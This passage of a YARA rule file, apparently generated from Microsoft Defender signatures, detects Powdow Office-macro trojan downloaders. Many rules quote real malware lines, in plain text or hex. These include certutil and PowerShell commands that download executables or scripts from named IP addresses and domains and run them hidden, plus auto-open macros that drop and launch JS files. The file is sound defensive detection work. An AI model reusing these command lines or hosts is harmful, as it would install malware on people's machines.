        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 38 2e 31 37 39 2e 31 31 31 2e 32 34 30 2f [0-3] 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-31] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 20 26 26 20 02 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_MPD_2147815849_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.MPD!MTB"
        threat_id = "2147815849"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 38 2e 31 39 33 2e 31 30 32 2e 32 33 32 2f [0-3] 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-31] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 20 26 26 20 02 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_QVST_2147815967_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.QVST!MTB"
        threat_id = "2147815967"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "F2 = .TextBoxes(\"TextBox 1\").Name" ascii //weight: 1
        $x_1_2 = "Set ntpalLMRN = eHTkn.OpenTextFile(BZNd + \"\\QAITB.vbs\", 8, True)" ascii //weight: 1
        $x_1_3 = "ogRx = lPNmPg.Open(f5fg0e + \"\\QAITB.vbs\")" ascii //weight: 1
        $x_1_4 = "EndTick = GetTickCount + (Finish * 1000)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_QVSV_2147815968_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.QVSV!MTB"
        threat_id = "2147815968"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "LQmvv = Environ$(Cells(2, 1))" ascii //weight: 1
        $x_1_2 = "WVRcFD.Namespace(LQmvv).Self.InvokeVerb \"Paste" ascii //weight: 1
        $x_1_3 = "Name LQmvv + \"\\zlVri.txt\" As LQmvv + \"\\zlVri.js" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_NPD_2147815998_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.NPD!MTB"
        threat_id = "2147815998"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"https://upc7are.anondns.net/c/Lespovpn.exe\"" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_OPD_2147816089_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.OPD!MTB"
        threat_id = "2147816089"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"https://greenlabeg.com/Axwyhnscm.com\"" ascii //weight: 1
        $x_1_2 = ".exe.exe && Ssrstibsygzobjvijcdu.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PPD_2147816216_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PPD!MTB"
        threat_id = "2147816216"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 30 30 2e 32 36 2e 31 30 39 2e 31 39 39 2f 72 2d 37 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-32] 69 6d 67 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-15] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAR_2147816302_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAR!MTB"
        threat_id = "2147816302"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "://ach-edi.xyz/remit/mail.exe\"" ascii //weight: 5
        $x_5_2 = "://34.255.217.70/putty.exe\"" ascii //weight: 5
        $x_1_3 = "CreateObject(\"WScript.Shell\").Run cmdLine, 0" ascii //weight: 1
        $x_1_4 = ".Open \"GET\", myURL, False ', \"username\", \"password\"" ascii //weight: 1
        $x_1_5 = {57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 0d 0a 20 20 20 20 44 6f 77 6e 6c 6f 61 64 41 6e 64 45 78 65 63 75 74 65}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 3 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_RVAT_2147816537_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAT!MTB"
        threat_id = "2147816537"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = "GetObject(hrWUX).Get(aSMXUWKZ).Create (\"wscript C:\\Users\\Public\\update.js\")" ascii //weight: 5
        $x_5_2 = "GetObject(jiaksidj).Get(iajsdkasodk).Create (\"wscript C:\\Users\\Public\\killlll.js\")" ascii //weight: 5
        $x_1_3 = {43 3a 5c 78 35 63 50 72 6f 67 72 61 6d 44 61 74 61 5c 78 35 63 64 64 6f 6e 64 2e 63 6f 6d 5c 78 32 30 68 74 74 70 73 3a 2f 2f 77 77 77 2e 6d 65 64 69 61 66 69 72 65 2e 63 6f 6d 2f 66 69 6c 65 2f ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2f [0-10] 2e 68 74 6d 2f 66 69 6c 65 27}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_RVAV_2147816543_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAV!MTB"
        threat_id = "2147816543"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 44 6f 77 6e 6c 6f 61 64 53 74 72 69 6e 67 28 27 68 74 74 70 3a 2f 2f 34 36 2e 34 2e 31 39 38 2e 35 35 2f ?? 2f 62 6f 6f 6b 2e 70 73 31 27 29}  //weight: 1, accuracy: Low
        $x_1_2 = "CreateProcessA(0&, Chr(112) + \"ower\" + \"shell.exe \" + Chr(150) + \"WindowStyle Hidden\"" ascii //weight: 1
        $x_1_3 = "\"powershell.exe\", 0&, 0&, 1&, NORMAL_PRIORITY_CLASS, 0&, 0&, start, proc)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RPD_2147816605_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RPD!MTB"
        threat_id = "2147816605"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://66.42.107.233/\"\" Tzhqmufsgffaolzgu.exe.exe && Tzhqmufsgffaolzgu.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SPD_2147816685_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SPD!MTB"
        threat_id = "2147816685"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://20.40.97.94/itl/loader/uploads/EQN72106062611.bat\"" ascii //weight: 1
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-15] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAU_2147816803_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAU!MTB"
        threat_id = "2147816803"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 65 74 4f 62 6a 65 63 74 28 [0-20] 29 2e 47 65 74 28 [0-15] 29 2e 43 72 65 61 74 65 20 28 22 77 73 63 72 69 70 74 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-15] 2e 6a 73 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 3a 5c 78 35 63 50 72 6f 67 72 61 6d 44 61 74 61 5c 78 35 63 64 64 6f 6e 64 2e 63 6f 6d 5c 78 32 30 68 74 74 70 73 3a 2f 2f 77 77 77 2e 6d 65 64 69 61 66 69 72 65 2e 63 6f 6d 2f 66 69 6c 65 2f ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2f [0-10] 2e 68 74 6d 2f 66 69 6c 65 27}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAW_2147816949_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAW!MTB"
        threat_id = "2147816949"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "kill(\"c:\\users\\\"&environ(\"username\")&\"\\documents\\\"&\"tue.zip\")" ascii //weight: 1
        $x_1_2 = "createobject(\"wscript.shell\").specialfolders(\"mydocuments\")&\"\\tue.zip\"ret=urldownloadtofile(0,strurl,strpath,0,0" ascii //weight: 1
        $x_1_3 = "\"h\"sae(1)=\"t\"sae(2)=\"p\"sae(3)=\"s\"sae(4)=\":\"sae(5)=\"/\"" ascii //weight: 1
        $x_1_4 = "auto_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_TPD_2147817099_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.TPD!MTB"
        threat_id = "2147817099"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 34 39 2e 31 32 2e 32 34 34 2e 31 35 34 2f 66 73 2d 31 64 2f 77 64 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-15] 2e 62 61 74 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAX_2147817112_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAX!MTB"
        threat_id = "2147817112"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "shell(\"c:\\users\\\"&environ(\"username\")&\"\\documents\"&\"xl.png\")" ascii //weight: 1
        $x_1_2 = "createobject(\"wscript.shell\").specialfolders(\"mydocuments\")&\"\\ttt.zip\"ret=urldownloadtofile(0,strurl,strpath,0,0)" ascii //weight: 1
        $x_1_3 = "sae(0)=\"h\"sae(1)=\"t\"sae(2)=\"p\"sae(3)=\"s\"sae(4)=\":\"sae(5)=\"/\"" ascii //weight: 1
        $x_1_4 = "auto_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_UPD_2147817151_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.UPD!MTB"
        threat_id = "2147817151"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 33 2e 37 30 2e 32 34 37 2e 32 32 39 2f [0-5] 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-31] 2e 62 61 74 22 22 20 [0-32] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-32] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BBQA_2147817248_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BBQA!MTB"
        threat_id = "2147817248"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "eW.teN tc' + 'ejbO-weN('; $b4df='olnwoD.)tnei' + 'lCb'; $c3=')''sbv.sdapeton\\''+pmet:vne$,''sbv.tneilC/cam/lrpsw/moc.ehgityennikcm//:" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAY_2147817281_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAY!MTB"
        threat_id = "2147817281"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "wscriptc:\\users\\public\\textfile.js\"callshell(a,vbnormalfocus)" ascii //weight: 1
        $x_1_2 = "=worksheets(\"blanked\").range(\"to1029\")print#textfile,youtube" ascii //weight: 1
        $x_1_3 = "workbook_open()motorfileendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAZ_2147817338_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAZ!MTB"
        threat_id = "2147817338"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "myFile = \"C:\\Users\\Public\\update.js\"" ascii //weight: 1
        $x_1_2 = {22 57 53 43 52 49 50 54 22 20 2b 20 22 20 22 20 2b 20 6d 79 46 69 6c 65 0d 0a 44 65 62 75 67 2e 41 73 73 65 72 74 20 53 68 65 6c 6c 28 61 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: High
        $x_1_3 = {57 6f 72 6b 73 68 65 65 74 73 28 22 73 68 65 6d 61 6c 65 22 29 2e 52 61 6e 67 65 28 22 41 44 32 30 22 29 0d 0a 50 72 69 6e 74 20 23 54 65 78 74 46 69 6c 65 2c 20 79 6f 75 74 75 62 65}  //weight: 1, accuracy: High
        $x_1_4 = "Open myFile For Output As TextFile" ascii //weight: 1
        $x_1_5 = "Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DDSM_2147817339_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DDSM!MTB"
        threat_id = "2147817339"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "687474703a2f2f36362e3135302e36362e" ascii //weight: 2
        $x_1_2 = "72756e646c6c333220433a5c57696e646f77735c5461736b735c" ascii //weight: 1
        $x_1_3 = {34 33 33 61 35 63 35 37 36 39 [0-47] 36 65 36 34 36 66 37 37 37 33 35 63 35 34 36 31 37 33 36 62 37 33 35 63 [0-15] 32 65 36 34 36 63 36 63}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_VPD_2147817540_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.VPD!MTB"
        threat_id = "2147817540"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 77 77 77 2e 73 61 72 61 68 62 75 72 72 65 6c 6c 2e 69 6e 66 6f 2f 6e 64 78 7a 73 74 75 64 69 6f 2f 6c 61 6e 67 2f 65 73 2d 65 73 2f [0-10] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 01 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_OISM_2147817713_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.OISM!MTB"
        threat_id = "2147817713"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "45.147.230.248/owersite.exe" ascii //weight: 1
        $x_1_2 = "Shell(\"C:\\Users\\Public\\Downloads\\ratcode.exe\", 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_WPD_2147817766_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.WPD!MTB"
        threat_id = "2147817766"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 39 36 39 30 30 31 31 32 35 38 33 33 34 38 32 33 31 33 2f 39 36 39 30 30 32 33 39 38 34 35 32 34 34 35 32 31 34 2f 4e 65 71 70 74 73 64 66 65 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 00 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BIB_2147818272_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BIB!MTB"
        threat_id = "2147818272"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sbv.tneilC02%detcetorP/3/oc.hcnuphcnip//:" ascii //weight: 1
        $x_1_2 = "IEX($TC|% {-join($_[-1..-$_.Length])});start-process($env:temp+ '\\notepad.vbs')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_XPD_2147818369_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.XPD!MTB"
        threat_id = "2147818369"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 39 36 35 36 33 33 34 38 33 36 38 39 30 35 38 33 30 34 2f [0-24] 2f 31 2e 65 78 65 22 22 20 [0-37] 2e 65 78 65 2e 65 78 65 20 26 26 20 01 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BBT_2147818390_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BBT!MTB"
        threat_id = "2147818390"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "IEX (New-Object Net.WebClient).DownloadString('http://138.201.149.43/1Kaufvertrag682/as.ps1')\", 0&, 0&, 1&, NORMAL_PRIORITY_CLASS, 0&, 0&, start, proc)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RPWD_2147818443_0
{
    meta:
        author = "defender2yara"
